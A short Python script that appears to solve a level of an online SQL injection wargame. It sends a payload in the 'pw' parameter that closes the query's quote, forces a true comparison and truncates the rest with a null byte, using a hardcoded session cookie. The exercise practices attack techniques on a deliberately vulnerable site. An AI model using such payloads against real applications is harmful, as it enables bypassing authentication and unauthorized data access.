import requests

cookies = {"PHPSESSID": "hnqqnd0kksjcna51oknp9s2b4s"}

url = "https://los.rubiya.kr/chall/nightmare_be1285a95aa20e8fa154cb977c37fee5.php"

params = {"pw": "')=0;\0"}

r = requests.get(url, params=params, cookies=cookies)
print(r.text)